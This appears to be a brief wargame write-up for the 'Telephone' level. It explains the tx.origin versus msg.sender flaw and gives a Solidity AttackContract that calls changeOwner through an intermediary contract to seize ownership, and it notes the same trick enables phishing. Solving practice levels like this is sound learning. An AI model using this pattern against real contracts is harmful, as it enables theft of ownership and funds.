## Telephone

1. This one is easy just do it like previous one and call changeOwner... so when you use AttackContract to attack on changeOwner the msg.sender will be AttackContract and self address will be tx.origin => also this tx.origin can be used to do phishing in similar way if someone uses it.
2. success

> putting the code bc i put some effort in writing it in remix

```solidity
interface Telephone {
    function changeOwner(address _owner) external;
}

contract AttackContract {
    Telephone public attack;

    constructor(address _address){
        attack = Telephone(_address);
    }

    function funcAttack(address _newO) public {
        attack.changeOwner(_newO);
    }
}
```
